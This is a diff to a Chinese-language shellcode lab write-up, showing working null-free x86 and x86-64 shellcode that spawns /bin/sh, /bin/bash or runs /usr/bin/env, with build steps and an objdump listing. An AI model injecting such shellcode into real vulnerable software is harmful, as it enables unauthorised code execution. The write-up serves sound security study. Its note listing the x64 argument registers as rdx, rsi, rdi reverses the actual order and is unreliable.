@@ -283,7 +283,7 @@ section .text
 
 > Invoking execve(“/bin/sh”, argv, 0)
 >
-> – **eax** = 0x0b: execve() system call number
+> –**eax** = 0x0b: execve() system call number
 >
 > –**ebx** = address of the command string “/bin/sh”
 >
@@ -292,4 +292,173 @@ section .text
 > –**edx** = address of environment variables (set to 0)
 
 # Task 2: Using Code Segment
+
+```asm
+section .text
+  global _start
+    _start:
+      
+      	BITS 32
+        jmp short two
+   
+   	one:
+        pop ebx ; ebx储存字符串地址
+        xor eax, eax ; 将eax置为0
+        mov [ebx+7], al ;将al，也即是0替换*
+        mov [ebx+8], ebx  ;将字符串的地址赋给AAAA所在的内存处(4 bytes)
+        mov [ebx+12], eax ; 将0赋给BBBB所在内存处
+        lea ecx, [ebx+8] ; ecx=ebx+8，也即是ecx储存/bin/sh\0的地址
+        xor edx, edx ;edx为0，表示无环境变量
+        mov al,  0x0b ;系统调用号
+        int 0x80
+        
+    two:
+        call one
+        db '/bin/sh*AAAABBBB' 
+```
+
+程序的几点解释
+
+- 详见注释
+
+- 程序先跳到two
+- two通过call指令调用one函数，这样的话，会将返回地址，也即是`'/bin/sh*AAAABBBB' `压入栈中，后面就可以使用pop ebx储存字符串地址
+
+为何可以触发shell：
+
+- edx为0，表示无环境变量
+- ecx储存/bin/sh\0的地址
+- ebx储存db字符串地址
+
+**执行/usr/bin/env，并且打印出环境变量**
+
+```asm
+section .text
+  global _start
+    _start:
+        BITS 32
+        jmp short two
+    one:
+        pop ebx
+        xor eax, eax
+
+        ;the next 4 lines converse # into 0
+        mov [ebx+12], al
+        mov [ebx+15], al
+        mov [ebx+20], al
+        mov [ebx+25], al
+
+        mov [ebx+26],ebx ;put address of "/usr/bin/env\0" to where AAAA is
+
+        lea eax,[ebx+13]
+        mov [ebx+30],eax ;put address of "-i\0" to where BBBB is 
+
+        lea eax,[ebx+16]
+        mov [ebx+34],eax ;put address of "a=11\0" to where CCCC is
+
+        lea eax,[ebx+21]
+        mov [ebx+38],eax ;put address of "b=22\0" to where DDDD is
+
+        xor eax,eax
+        mov [ebx+42],eax ;0 terminate
+
+        ; now ebx point to "/usr/bin/env\0"     
+
+        lea ecx, [ebx+26] ;put address of "/usr/bin/env -i a=11 b=22" to ecx 
+
+        xor edx,edx ; edx = 0 
+
+        mov al,  0x0b
+        int 0x80
+     two:
+        call one
+        db '/usr/bin/env#-i#a=11#b=22#AAAABBBBCCCCDDDDEEEE'
+           ;012345678901234567890123456789012345678901234567890
+           ;          1         2         3         4    
+```
+
+- 代码和详细注释见上面
+- '/usr/bin/env#-i#a=11#b=22#AAAABBBBCCCCDDDDEEEE'是我们构造的字符串，通过call + pop指令可以获取该地址
+  - #是占位符。为了防止0导致strcpy无法复制字符串，这里使用#作为占位符，后面会用al进行替换
+- `/usr/bin/env -i a=11 b=22`是我们要执行的命令（一定要注意到字符串最后有个\0）
+  - ecx存储argv的地址，因此指向ebx+26
+  - ebx存储“/usr/bin/env\0”的地址
+
+```shell
+mysh2: mysh2.s
+	nasm -f elf32 $@.s -o $@.o
+	ld --omagic -m elf_i386 $@.o -o $@
+```
+
+编译执行，运行了新的shell（omagic 选项使得代码段是可写的）
+
+# Task 3: Writing 64-bit Shellcode
+
+我们的任务是在64位的情况下执行`/bin/bash`
+
+注意到64位和32位的不同：
+
+- 对于 x64架构，调用系统调用是通过 syscall 指令完成的
+- 系统调用的前三个参数分别存储在 rdx、 rsi 和 rdi 寄存器中
+
+
+
+```asm
+section .text
+  global _start
+    _start:
+      ; The following code calls execve("/bin/sh", ...)
+      xor  rdx, rdx       ; 3rd argument
+      push rdx
+        mov rax,"h#######"
+        shl rax,56
+        shr rax,56
+        push rax
+      mov rax,'/bin/bas'
+      push rax
+      mov rdi, rsp        ; 1st argument
+      push rdx ; 重点是这两行
+      push rdi 
+      mov rsi, rsp        ; 2nd argument
+      xor  rax, rax
+      mov al, 0x3b        ; execve()
+      syscall
+```
+
+几点需要注意的：
+
+- rax是系统调用号，这里执行execve
+- rdi储存`/bin/bash\0`的地址
+- rdx是0
+
+objdump一下，发现确实没有0字节
+
+```asm
+$ objdump -Mintel -d mysh_64
+
+mysh_64:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000401000 <_start>:
+  401000:	48 31 d2             	xor    rdx,rdx
+  401003:	52                   	push   rdx
+  401004:	48 b8 68 23 23 23 23 	movabs rax,0x2323232323232368
+  40100b:	23 23 23 
+  40100e:	48 c1 e0 38          	shl    rax,0x38
+  401012:	48 c1 e8 38          	shr    rax,0x38
+  401016:	50                   	push   rax
+  401017:	48 b8 2f 62 69 6e 2f 	movabs rax,0x7361622f6e69622f
+  40101e:	62 61 73 
+  401021:	50                   	push   rax
+  401022:	48 89 e7             	mov    rdi,rsp
+  401025:	52                   	push   rdx
+  401026:	57                   	push   rdi
+  401027:	48 89 e6             	mov    rsi,rsp
+  40102a:	48 31 c0             	xor    rax,rax
+  40102d:	b0 3b                	mov    al,0x3b
+  40102f:	0f 05                	syscall 
+
+```
 
